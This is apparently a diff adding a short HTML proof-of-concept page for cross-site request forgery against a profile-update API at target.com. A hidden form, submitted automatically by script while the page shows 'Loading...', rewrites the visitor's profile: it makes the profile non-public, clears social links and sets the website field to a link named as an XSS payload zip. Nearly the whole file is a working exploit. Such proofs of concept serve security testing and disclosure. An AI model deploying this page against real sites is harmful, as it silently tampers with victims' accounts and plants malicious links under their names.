@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>CSRF PoC</title>
+</head>
+
+<body>
+    <h2>Loading...</h2>
+
+    <form id="csrfForm" action="https://target.com/api/update_profile" method="POST">
+        <input type="hidden" name="track_records" value='[]'>
+        <input type="hidden" name="hunter_profile[public]" value="false">
+        <input type="hidden" name="hunter_profile[github]" value="">
+        <input type="hidden" name="hunter_profile[twitter]" value="">
+        <input type="hidden" name="hunter_profile[website]" value="github.com/james256x/xss_payload/blob/main/test2.zip">
+        <input type="hidden" name="hunter_profile[public_civility]" value="false">
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+
+</html>
